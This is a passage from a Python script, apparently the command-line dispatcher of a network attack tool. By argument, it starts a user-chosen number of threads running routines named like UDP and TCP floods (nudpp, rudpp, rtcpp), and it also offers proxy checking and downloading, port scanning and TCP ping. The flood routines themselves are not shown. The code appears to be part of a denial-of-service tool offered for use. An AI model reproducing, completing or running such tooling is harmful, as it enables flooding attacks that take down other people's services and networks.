					Thread(target=n.nudpp).start()				
			elif argv[1] == 'rudp':
				for _ in range(int(argv[5])):
					Thread(target=n.rudpp).start()				
			elif argv[1] == 'rtcp':
				for _ in range(int(argv[5])):
					Thread(target=n.rtcpp).start()				
		else:
			ban()
	elif argv[1] == 'proxy':
		if len(argv) == 4:
			n = proxx(int(argv[2]), int(argv[3]))
			n.checkk()
		elif len(argv) == 3:
			n = proxx(int(argv[2]), None)
			n.downn()
		else:
			proo()
	elif argv[1] == 'tool':
		if len(argv) == 5:
			n = dtool(argv[2], argv[3], 5)
			n.pscan()
		elif len(argv) == 6:
			n = dtool(argv[2], int(argv[3]), int(argv[4]))
			n.tping()
		else:
			tol()
